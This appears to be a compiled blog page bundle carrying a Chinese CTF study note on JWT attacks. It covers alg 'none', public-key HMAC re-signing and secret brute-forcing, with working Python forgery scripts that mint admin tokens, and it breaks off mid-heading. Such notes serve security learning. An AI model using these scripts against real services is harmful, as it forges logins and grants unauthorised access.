import{_ as E}from"./ValaxyMain.vue_vue_type_style_index_0_lang-DRVqeRiY.js";import{a as d,p as k,o as c,c as g,w as l,f as y,r as n,g as s,h as i}from"./app-CzjF7NIc.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-17i98rOK.js";import"./YunCard.vue_vue_type_script_setup_true_lang-Da3dkqK-.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-BsneHNVS.js";import"./index-C7yU5XnD.js";const o=s("h2",{id:"场景总结",tabindex:"-1"},[i("场景总结 "),s("a",{class:"header-anchor",href:"#场景总结","aria-label":'Permalink to "场景总结"'},"​")],-1),F=s("p",null,[i("首先要明白，一个jwt是由三部分组成的：header，payload，signature。三个部分用 "),s("code",null,"."),i(" 连接，用base64编码且格式要求去掉末尾的 "),s("code",null,"=")],-1),u=s("p",null,[i("其他额外需要知道的，例如header下有时会有叫 "),s("code",null,"kid"),i(" 的parameter，这个是key identifier的缩写，可被某些库用（如果没有妥善地处理，可以导致SQLi，Dir traversel … 还有rce)。本文用到的例子里有写.")],-1),C=s("p",null,"能够破解的方式总结的话有以下场景",-1),b=s("ul",null,[s("li",null,[s("p",null,"不检查signature - 直接修改payload便好")]),s("li",null,[s("p",null,"加密可取消")]),s("li",null,[s("p",null,"加密方式可爆破")]),s("li",null,[s("p",null,"从公钥pem文件泄漏场景到RSA256转为HS256方式绕过签名")]),s("li",null,[s("p",null,"利用kid读取文件实现伪造身份")]),s("li",null,[s("p",null,"利用kid实现SQL注入")]),s("li",null,[s("p",null,"利用kid实现rce（CVE-2017-17405）")])],-1),_=s("p",null,"备注：",-1),m=s("ol",null,[s("li",null,[s("p",null,"出现的python脚本都仅供参考，都是刷题时临时写的，没有实现完全自动化。")]),s("li",null,[s("p",null,"刷题遇到的坑和失败尝试这里就不写出来了，推荐最好还是找类似的实战场景去练习一下，才能更清楚jwt相关漏洞的具体利用思路和过程。")]),s("li",null,[s("p",null,"部分不举例，例如直接修改payload")])],-1),f=s("h3",{id:"加密可取消",tabindex:"-1"},[i("加密可取消 "),s("a",{class:"header-anchor",href:"#加密可取消","aria-label":'Permalink to "加密可取消"'},"​")],-1),B=s("p",null,"直接将header下的alg改为none，例如：",-1),A=s("div",{class:"language- vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"}),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",null,"{")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span",null,'"alg": "none",')]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span",null,'"typ": "JWS"')]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span")]),i(`
`),s("span",{class:"line"},[s("span",null,"}")])])]),s("button",{class:"collapse"})],-1),v=s("p",null,"然后对header单独进行base64编码（注意去掉末尾的=）",-1),D=s("p",null,[i("我在刷题的时候，遇到了小写的 "),s("code",null,"none"),i(" 不成功的情况，改成大写的 "),s("code",null,"None"),i(" 就可以了。（但是后续看官方题解，好像小写的也可以，目前为止这块不是特别清楚。）")],-1),w=s("h3",{id:"公钥泄漏",tabindex:"-1"},[i("公钥泄漏 "),s("a",{class:"header-anchor",href:"#公钥泄漏","aria-label":'Permalink to "公钥泄漏"'},"​")],-1),j=s("p",null,"直接用python下的hmac&hashlib库，对header和body进行新的签名，参考我刷题时写的代码",-1),J=s("div",{class:"language-python vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"python"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hashlib")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"with"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," open"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'public.pem'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'rb'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},") "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"as"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," f:")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"public_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," f.read()")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(public_key)")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msg "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sig "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64.urlsafe_b64encode(hmac.new(public_key,msg,hashlib.sha256).digest()).decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# sig = base64.urlsafe_b64encode(hmac.new(bytes(public_key, encoding='utf-8'),msg,hashlib.sha256).digest()).decode('utf-8').rstrip('=')")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"type"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(msg))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(msg.decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},") "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"+"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '.'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," +"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," sig)")])])]),s("button",{class:"collapse"})],-1),I=s("h3",{id:"加密方式可爆破",tabindex:"-1"},[i("加密方式可爆破 "),s("a",{class:"header-anchor",href:"#加密方式可爆破","aria-label":'Permalink to "加密方式可爆破"'},"​")],-1),L=s("p",null,"两种方法，一种用hashcat或者自己写脚本，以下是我写的python脚本",-1),S=s("div",{class:"language-python vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"python"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hashlib")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," json")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"jwt "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"def"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," change_payload"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(jwt):")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"payload "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," jwt.split("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'.'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")["),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"orgin_p "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," json.loads(base64.b64decode(payload"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"+"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'=='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"orgin_p["),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'admin'")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"changed_p "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64.b64encode(json.dumps(orgin_p).rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"return"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," changed_p")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"def"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," brute_sig"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(key,object):")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"new_sign "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac.new(key, "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"object"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},", hashlib.sha256).digest()")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"return"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64.urlsafe_b64encode(new_sign).decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"header "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," jwt.split("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'.'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")["),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"0"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"payload "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," change_payload(jwt)")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"origin_sign "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," jwt.split("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'.'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")["),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"brute_keys "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ["),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'hacker'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'jwt'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'insecurity'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'your-key'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'hacking'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"] "),s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"#or read from file")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"for"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," try_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"in"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," brute_keys:")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"target "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "."'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".join(jwt.split("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'.'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")[:"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"])")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," try_key.encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"if"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," brute_sig(key, target.encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")) "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"=="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," origin_sign:")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'[*]Brute sucess,the key is "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{}"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".format(try_key))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"new_target "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{}"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"."),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{}"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".format(header.rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"),payload.decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"jwt "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," new_target "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"+"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '.'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," +"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," brute_sig(key, new_target.encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")).rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'[*]new jwt is: "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{}"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".format(jwt))")])])]),s("button",{class:"collapse"})],-1),$=s("h3",{id:"从rsa256转为hs256方式绕过签名",tabindex:"-1"},[i("从RSA256转为HS256方式绕过签名 "),s("a",{class:"header-anchor",href:"#从rsa256转为hs256方式绕过签名","aria-label":'Permalink to 